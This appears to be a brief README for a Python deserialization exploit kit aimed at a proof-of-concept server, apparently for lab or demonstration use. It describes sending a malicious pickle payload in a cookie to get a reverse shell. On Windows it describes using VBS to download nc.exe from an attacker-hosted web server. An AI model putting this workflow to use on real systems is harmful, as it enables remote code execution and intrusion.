Linux:

1. exploitlinux.py <TargetIp> <TargetPort> <HandlerIp> <HandlerPort>
2. This python exploit will send a correct payload in a cookie to the PoC server to execute a revshell
3. The two other script help us to generate files that contains a payload for a pickle.load function

Windows:
1. The approach is the same, but instead of executing directly commands to get a shell we need to write some vbs script to download the nc.exe
2. Python creates on the fly a light webserver to serve the nc.exe in desired port (take care with some server configurations that maybe are not the best)
3. You need to have nc.exe standalone executable with -e option in your Exploit folder


Both script will start to listen to receive a shell, but this is highly configurable...
